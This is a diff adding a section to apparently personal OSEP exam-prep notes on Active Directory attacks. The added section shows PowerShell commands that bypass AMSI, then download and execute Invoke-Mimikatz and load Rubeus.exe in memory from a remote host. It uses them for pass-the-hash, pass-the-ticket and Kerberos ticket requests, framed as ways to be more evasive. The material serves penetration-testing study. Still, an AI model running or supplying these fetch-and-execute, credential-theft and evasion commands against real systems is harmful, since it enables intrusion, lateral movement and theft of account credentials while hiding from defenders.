@@ -1,6 +1,36 @@
 (Although the techniques explained here aren't teached in the OSEP, I found them pretty useful during my OSEP exam & labs, learning and researching
 about them also helped me improve my knowlegde of Active Directory which is always useful)
 
+When using mimikatz, consider using this powershell implementation([Invoke-Mimikatz.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)) once you've bypassed AMSI in order to be more evasive. Below are some examples(the amsi.txt file contents are [here](https://github.com/trike33/PEN-300-Code-Snippets/blob/main/AMSI%20Bypasses/PowerShell/AmsiContext.ps1)):
+
+```
+PS C:\> (New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/amsi.txt') | IEX
+
+PS C:\> (New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/Invoke-Mimikatz.ps1') | IEX
+
+PS C:\> Invoke-Mimikatz -Command "`"kerberos::list`""
+
+PS C:\> Invoke-Mimikatz -Command "`"sekurlsa::pth /user:user1 /domain:contoso.com /ntlm:<ntlm_hash> /run:PowerShell.exe`""
+
+PS C:\> Invoke-Mimikatz -Command "`"kerberos::ptt C:\ticket.kirbi`""
+```
+
+*Explanation of the backticks*: We must first quote on the -Command command line parameter, but the mimikatz command must also be itself in quotes. Because of that, we need to escape the inner quotes with a backtick character.
+
+Additionally, when using Rubeus, I recommend you to invoke it via PowerShell reflection as follows:
+
+```
+PS C:\> (New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/amsi.txt')
+
+PS C:\> $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.1/Rubeus.exe')
+
+PS C:\> $assem = [System.Reflection.Assembly]::Load($data)
+
+PS C:\> [Rubeus.Program]::Main("asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt".Split())
+
+PS C:\> [Rubeus.Program]::Main("ptt /ticket:<ticket_kirbi_file>".Split())
+```
+
 **PASS THE HASH:**
 
 The pass-the-hash techinque allows an attacker to authenticate to remote systems using the user NTLM hash(the static part, also known as NT hash). 
